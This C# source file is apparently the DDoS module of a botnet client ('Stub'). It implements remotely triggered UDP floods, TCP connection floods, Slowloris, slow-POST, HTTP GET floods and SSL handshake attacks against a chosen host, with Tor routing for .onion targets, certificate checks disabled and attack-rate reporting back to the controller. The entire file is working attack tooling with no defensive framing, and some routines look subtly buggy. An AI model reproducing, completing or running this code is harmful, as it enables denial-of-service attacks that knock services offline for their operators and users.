using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Stub.Utilities;
using System.Diagnostics;
using Stub.Core.Config;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;

namespace Stub.Core.Modules.DDoS
{
    #region DDOS_HANDLER
    static class CDDoSHandler
    {
        public delegate void delOnDdosInfo(int iAttackID, int iRate, int iPPS);
        public static event delOnDdosInfo OnDdosInfo;

		static List<CDDoS> lstActiveAttacks = new List<CDDoS>();
		
		public static bool StartAttack(Int32 iID, Int32 iAttackType, String strHost, Int32 iPort, DateTime? EndDate, int iSockets, int iInterval)
		{
            try
            {
                CDDoS New_Attack = new CDDoS(iID, iAttackType, strHost, iPort, EndDate, iSockets, iInterval);
                New_Attack.OnData += New_Attack_OnData;
                if (New_Attack.StartAttack())
                    lstActiveAttacks.Add(New_Attack);
                return true;
            }
            catch(Exception ex)
            {
#if DEBUG
                Console.WriteLine("CDDoSHandler::StartAttack Threw a Exception: {0}", ex.Message);
#endif
            }
			return false;
		}

        static void New_Attack_OnData(int iAttackID, int iPPS, int iRate)
        {
            if (OnDdosInfo != null) OnDdosInfo.Invoke(iAttackID, iRate, iPPS);
        }

        /// <summary>
        /// Stop Attack by ID
        /// </summary>
        /// <param name="iID">-1 to stop all.</param>
        public static void StopAttack(Int32 iID)
        {
            try
            {
                for (int i = 0; i < lstActiveAttacks.Count; i++)
                {
                    CDDoS Active_Attack = lstActiveAttacks[i];

                    if (Active_Attack.iID != iID && iID != -1)
                        continue;

                    Active_Attack.OnData -= New_Attack_OnData;
                    Active_Attack.StopAttack();

                    lstActiveAttacks.Remove(Active_Attack);
                    break;

                }
            }
            catch { }
        }

        public static void StopAll()
        {
            try
            {
                StopAttack(-1);
            }
            catch { }
        }
    }
    #endregion

    #region DENIAL_SOCKET
    class CDenialSocket
    {
        public Socket ClientSocket;
        public SslStream ClientStream;

        public DateTime ReportAt = DateTime.Now.AddMinutes(1);
        public DateTime? ReportTime = null;

        private int iRate, iPPS, iReportRate, iReportPPS;

        public delegate void delOnData(int iPPS, int iRate);
        public event delOnData OnData;

        public void CalcInfo(int iSent)
        {
            if (!this.ReportTime.HasValue)
            {
                this.ReportTime = DateTime.Now.AddSeconds(1);
            }

            if (this.ReportTime > DateTime.Now)
            {
                iRate += iSent;
                iPPS++;
            }
            else
            {
                this.iReportRate = iRate;
                this.iReportPPS = iPPS;
                this.ReportTime = DateTime.Now.AddSeconds(1);
                this.iRate = 0;
                this.iPPS = 0;

                if (this.OnData != null) this.OnData(iReportPPS, iReportRate);          
            }
        }

        public bool SendBuffer(byte[] arr_bBuffer)
        {
            try
            {
                if (ClientStream != null) ClientStream.Write(arr_bBuffer);
                else ClientSocket.Send(arr_bBuffer);

                CalcInfo(arr_bBuffer.Length);

                return true;
            }
            catch { }

            return false;
        }

        ~CDenialSocket()
        {
            this.OnData = null;
        }
    }
    #endregion

    #region ATTACK_TYPE
    enum ATTACK_TYPE : int
    {
        UDP = 0,
        RCD = 1,
        SLOWPOST = 2,
        SLOWLORIS = 3,
        HTTPGET = 4,
        HANDSHAKE = 5
    }

    class CAttackType
    {
        private ATTACK_TYPE AttackType;
        
        const int iMin = 0;
        const int iMax = 5;

        public CAttackType(int iAttackType)
        {
            this.AttackType = (ATTACK_TYPE)iAttackType;
        }

        public bool IsValid()
        {
            try
            {
                int iType = (int)AttackType;

                return iType >= iMin && iType <= iMax;
            }
            catch { }

            return false;
        }

        public ATTACK_TYPE GetAttackType()
        {
            return AttackType;
        }
    }
    #endregion

    /// <summary>
    /// Attack Types
    /// 0 - UDP
    /// 1 - TCP
    /// 2 - Slowpost
    /// 3 - Slowloris
    /// 4 - HTTP-GET
    /// 5 - SSL Hand-shake
    /// </summary>
    class CDDoS
    {
        #region VARIABLES
        public Int32 iID;
        private CAttackType m_AttackType;
        private Int32 m_iPort;
		private String m_strHost, m_strPage;
		private Boolean m_bIsRunning = false;
        private DateTime? m_EndDate = null;
        private int iRate, iPPS;
        private DateTime ReportTime = DateTime.Now.AddMinutes(1);
        private bool m_bUseTor = false;
        private bool m_bUseSSL = false;
        private int m_iInterval = 100;
        private int m_iSockets = 10;
        #endregion

        #region EVENTS
        public delegate void delOnData(int iAttackID, int iPPS, int iRate);
        public event delOnData OnData;
        #endregion

        #region CONSTRUCTOR
        public CDDoS(Int32 iID, Int32 iAttackType, String strHost, Int32 iPort, DateTime? EndDate, int iSockets, int iInterval)
		{
            if (String.IsNullOrEmpty(strHost))
                throw new ArgumentNullException("strHost");

            if (iAttackType < 0 || iAttackType > 5)
                throw new ArgumentOutOfRangeException("iAttackType", "Such attack doesnt exist.");

            if (iPort <= 0 && iAttackType != 0)
                throw new ArgumentOutOfRangeException("iPort", "Random port is only supported for UDP.");

			this.iID = iID;
            this.m_AttackType = new CAttackType(iAttackType);
			this.m_strHost = strHost;

            if(iAttackType > 1) //Layer-7 Parse Page and Host
            {
                if(this.m_strHost.StartsWith(@"http://"))
                {
                    this.m_strHost = this.m_strHost.Remove(0, @"http://".Length);

                    Int32 iIndex = this.m_strHost.IndexOf(@"/");

                    if (iIndex != -1)
                    {
                        this.m_strPage = this.m_strHost.Remove(0, iIndex);

                        this.m_strHost = this.m_strHost.Remove(iIndex);
                    }
                    else this.m_strPage = "/";
#if DEBUG
                    Console.WriteLine("CDDoS :: Parsing finished. Result: m_strHost: {0} and m_strPage: {1}", this.m_strHost, this.m_strPage);
#endif
                }
                else if(m_strHost.StartsWith(@"https://"))
                {
                    this.m_strHost = this.m_strHost.Remove(0, @"https://".Length);

                    int iIndex = this.m_strHost.IndexOf(@"/");

                    if (iIndex != -1)
                    {
                        this.m_strPage = this.m_strHost.Remove(0, iIndex);

                        this.m_strHost = this.m_strHost.Remove(iIndex);
                    }
                    else this.m_strPage = "/";

                    this.m_bUseSSL = true;
                }

                if (!this.m_bUseSSL) this.m_bUseSSL = m_AttackType.GetAttackType() == ATTACK_TYPE.HANDSHAKE;

                m_bUseTor = m_strHost.EndsWith(".onion");
            }

			this.m_iPort = iPort;
            this.m_EndDate = EndDate;
            this.m_iSockets = iSockets;
            this.m_iInterval = iInterval;
		}
        #endregion

        #region START_ATTACK
        public bool StartAttack()
		{
            if (String.IsNullOrEmpty(this.m_strHost) || !this.m_AttackType.IsValid()) return false;

			try
			{
				m_bIsRunning = true;
				
				new Thread(delegate()
					{
                        try
                        {
                            for(int i = 0; i < m_iSockets; i++)
                            {
                                CDenialSocket AttackSocket = new CDenialSocket();
                                AttackSocket.ClientSocket = new Socket(AddressFamily.InterNetwork, this.m_AttackType.GetAttackType() == ATTACK_TYPE.UDP ? SocketType.Dgram : SocketType.Stream, this.m_AttackType.GetAttackType() == ATTACK_TYPE.UDP ? ProtocolType.Udp : ProtocolType.Tcp);
                                AttackSocket.OnData += AttackSocket_OnData;

                                if (this.m_AttackType.GetAttackType() == ATTACK_TYPE.UDP)
                                {
                                    byte[] arr_bDatagram = CUtils.RandomBytes(CUtils.RandomInt(128, 256));
                                    AttackSocket.ClientSocket.BeginSendTo(arr_bDatagram, 0, arr_bDatagram.Length, SocketFlags.None, (EndPoint)this.GetEndPoint(), new AsyncCallback(this.UDP_BeginSendTo_Callback), AttackSocket);
                                }
                                else AttackSocket.ClientSocket.BeginConnect((EndPoint)this.GetEndPoint(), new AsyncCallback(TCP_BeginConnect_Callback), AttackSocket);
                            }
                        }
                        catch { }
					}).Start();
				
				return m_bIsRunning;
			} catch { m_bIsRunning = false; }
			return m_bIsRunning;
		}
        #endregion

        #region ON_DATA_EVENT_HANDLER
        void AttackSocket_OnData(int iPPS, int iRate)
        {
            this.iRate += iRate;
            this.iPPS += iPPS;

            if(this.ReportTime < DateTime.Now)
            {
                if (this.OnData != null) 
                    this.OnData(this.iID, this.iPPS, this.iRate);
                this.iRate = 0;
                this.iPPS = 0;
                this.ReportTime = DateTime.Now.AddMinutes(1);
            }
        }
        #endregion

        #region STOP_ATTACK
        public void StopAttack()
        {
            m_bIsRunning = false;
        }
        #endregion

        #region GET_END_POINT
        IPEndPoint GetEndPoint()
        {
            try
            {
                if (this.m_bUseTor)
                    return new IPEndPoint(IPAddress.Parse(CBot.BotConfig.Tor_Host), CBot.BotConfig.Tor_Port);
                else
                    return new IPEndPoint(CUtils.ResolveHost(this.m_strHost), this.m_iPort == 0 ? CUtils.RandomInt(1, 65535) : this.m_iPort);
            }
            catch { }

            return null;
        }
        #endregion

        #region SHOULD_ATTACK
        /// <summary>
        /// Indicates if the attack should still be continued
        /// </summary>
        /// <returns>False if time ended or its force-stopped</returns>
        bool ShouldAttack()
        {
            if (!this.m_bIsRunning) return false;

            if (!this.m_EndDate.HasValue) return true;

            try
            {
                return m_EndDate.Value > DateTime.Now;
            }
            catch { }

            return false;
        }
        #endregion

        #region UDP_CALLBACK
        void UDP_BeginSendTo_Callback(IAsyncResult iar)
        {
            CDenialSocket AttackSocket = null;
            //Socket sockClient = null;
            try
            {
                AttackSocket = (CDenialSocket)iar.AsyncState;

                try
                {
                    Int32 iSent = AttackSocket.ClientSocket.EndSendTo(iar);

                    AttackSocket.CalcInfo(iSent);
                }
                catch { }

                AttackSocket.ClientSocket.Close();

                /*
                 * ToDo: PPS and Rate
                 */

                if (this.ShouldAttack())
                {
                    Thread.Sleep(m_iInterval);

                    Byte[] arr_bUDPBuffer = CUtils.RandomBytes(CUtils.RandomInt(128, 512));

                    AttackSocket.ClientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);

                    AttackSocket.ClientSocket.BeginSendTo(arr_bUDPBuffer, 0, arr_bUDPBuffer.Length, SocketFlags.None, (EndPoint)new IPEndPoint(CUtils.ResolveHost(this.m_strHost), this.m_iPort == 0 ? CUtils.RandomInt(80, 65000) : this.m_iPort), new AsyncCallback(UDP_BeginSendTo_Callback), AttackSocket);
                }
                else AttackSocket.OnData -= AttackSocket_OnData;
            }
            catch (Exception ex)
            {
#if DEBUG
                Console.WriteLine("UDP_BeginSendTo_Callback :: Exception: {0}", ex.ToString());
#endif
            }
        }
        #endregion

        #region AUTHORIZE_SOCKS
        bool AuthorizeSocks(string host, short hostPort, Socket sockClient)
        {
            try
            {
                byte[] HostNameBuf = new ASCIIEncoding().GetBytes(host);
                byte[] HostPortBuf = BitConverter.GetBytes(IPAddress.HostToNetworkOrder(hostPort));

                byte[] bufout = new byte[128];
                int buflen = 0;
                sockClient.Send(new byte[] { 5, 1, 0 }, 0, 3, SocketFlags.None);
                buflen = sockClient.Receive(bufout, 0, bufout.Length, SocketFlags.None);
                if (buflen != 2 || bufout[0] != 5 || bufout[1] != 0)
                    throw new Exception();

                byte[] buf = new byte[] { 5, 1, 0, 3, (byte)HostNameBuf.Length };
                MemoryStream mem = new MemoryStream();
                mem.Write(buf, 0, buf.Length);
                mem.Write(HostNameBuf, 0, HostNameBuf.Length);
                mem.Write(new byte[] { HostPortBuf[0], HostPortBuf[1] }, 0, 2);
                byte[] memarr = mem.ToArray();
                sockClient.Send(memarr, 0, memarr.Length, SocketFlags.None);
                buflen = sockClient.Receive(bufout, 0, bufout.Length, SocketFlags.None);
                if (bufout[0] != 5 || bufout[1] != 0)
                    throw new Exception();

                return true;
            }
            catch { }
            
            return false;
        }
        #endregion

        #region SSL_CERTIFICATE_VALIDATION
        bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors Errors)
        {
            return true;
        }
        #endregion

        #region TCP_BEGINCONNECT_CALLBACK
        void TCP_BeginConnect_Callback(IAsyncResult iar)
        {
            CDenialSocket AttackSocket = null;

            try
            {
                AttackSocket = (CDenialSocket)iar.AsyncState;

                try
                {
                    AttackSocket.ClientSocket.EndConnect(iar);

                    if (this.m_bUseTor) this.AuthorizeSocks(this.m_strHost, (short)this.m_iPort, AttackSocket.ClientSocket);

                    if(this.m_bUseSSL)
                    {
                        AttackSocket.ClientStream = new SslStream(new NetworkStream(AttackSocket.ClientSocket), false, new RemoteCertificateValidationCallback(this.ValidateServerCertificate));
                        AttackSocket.ClientStream.AuthenticateAsClient(Environment.MachineName);
                    }

                    switch (this.m_AttackType.GetAttackType())
                    {
                        case ATTACK_TYPE.HTTPGET:
                            this.SendHttpGet(AttackSocket);
                            break;
                        case ATTACK_TYPE.SLOWLORIS:
                            this.SendSlowloris(AttackSocket);
                            break;
                        case ATTACK_TYPE.SLOWPOST:
                            this.SendSlowloris(AttackSocket);
                            break;
                        default: AttackSocket.CalcInfo(0); break;
                    }
                }
                catch { }

                AttackSocket.ClientSocket.Close();

                Thread.Sleep(this.m_iInterval);

                if(this.ShouldAttack())
                {
                    AttackSocket.ClientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    AttackSocket.ClientSocket.BeginConnect((EndPoint)this.GetEndPoint(), new AsyncCallback(TCP_BeginConnect_Callback), AttackSocket);
                }
                else AttackSocket.OnData -= AttackSocket_OnData;
            }
            catch { }
        }
        #endregion

        #region SEND_HTTP_GET
        void SendHttpGet(CDenialSocket AttackSocket)
        {
            string strBuffer = string.Format(
                "GET {0} HTTP/1.1\r\nHost: {1}\r\nUser-Agent: Mozilla 4.0\r\nConnection: close\r\n\r\n",
                this.m_strPage, this.m_strHost
                );

            byte[] arr_bBuffer = UTF8Encoding.Default.GetBytes(strBuffer);

            if (!AttackSocket.SendBuffer(arr_bBuffer))
                return;

            if (CUtils.RandomInt(1, 2) == 2)
                return;

            arr_bBuffer = new byte[8192];

            int iRead = -1;

            while(iRead != 0)
            {
                try
                {
                    iRead = AttackSocket.ClientStream == null ? AttackSocket.ClientSocket.Receive(arr_bBuffer) : AttackSocket.ClientStream.Read(arr_bBuffer, 0, arr_bBuffer.Length);
                }
                catch { iRead = 0; }
            }
        }
        #endregion

        #region SEND_SLOWLORIS
        void SendSlowloris(CDenialSocket AttackSocket)
        {
            string strBuffer = string.Format(
                "GET {0} HTTP/1.1\r\nHost: {1}\r\nUser-Agent: Mozilla 4.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {2}\r\n",
                this.m_strPage, this.m_strHost, CUtils.RandomInt(30, 90)
                );

            byte[] arr_bBuffer = UTF8Encoding.Default.GetBytes(strBuffer);

            if (!AttackSocket.SendBuffer(arr_bBuffer))
                return;

            arr_bBuffer = UTF8Encoding.Default.GetBytes("X-a: b\r\n");

            while(this.ShouldAttack())
            {
                if (!AttackSocket.SendBuffer(arr_bBuffer))
                    break;
                Thread.Sleep(100);
            }
        }
        #endregion

        #region SEND_SLOWPOST
        void SendSlowpost(CDenialSocket AttackSocket)
        {
            string strRandomPOSTData = CUtils.RandomString(CUtils.RandomInt(25, 100));

            string strBuffer = string.Format(
                "POST {0} HTTP/1.1\r\nHost: {1}\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {2}\r\nConnection: close\r\n\r\n",
                this.m_strPage, this.m_strHost, strRandomPOSTData.Length
                );

            byte[] arr_bBuffer = UTF8Encoding.Default.GetBytes(strBuffer);

            if(AttackSocket.SendBuffer(arr_bBuffer))
                return;

            foreach (char c in strRandomPOSTData.ToCharArray())
            {
                if (!AttackSocket.SendBuffer(new byte[] { (byte)c })) break;

                Thread.Sleep(CUtils.RandomInt(1000, 3000));
            }
        }
        #endregion
    }
}
